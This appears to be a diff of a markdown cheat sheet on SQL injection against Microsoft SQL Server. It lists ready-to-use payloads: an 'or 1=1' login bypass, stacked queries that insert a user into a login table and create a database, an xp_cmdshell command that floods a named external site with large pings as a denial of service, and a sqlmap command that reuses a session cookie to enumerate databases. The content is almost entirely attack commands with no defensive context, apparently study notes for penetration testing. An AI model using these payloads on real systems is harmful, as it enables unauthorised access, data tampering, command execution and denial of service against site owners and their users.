@@ -3,9 +3,13 @@
 ## SQL Injection on an MS SQL Database ##
 
 ``` blah' or 1=1 -- - ```
+
 ``` blah'; insert into login values('john','apple123'); -- - ``` - Inserting a new user into the table 'login'
+
 ``` blah'; create database mydatabase; -- - ``` - Creating a new database
+
 ``` blah'; exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- - ``` - To perform a DoS to a site
+
 
 ### SQLMap ###
 ``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> --dbs ``` - It tampers with the parameters in the URL to attempt to extract database information
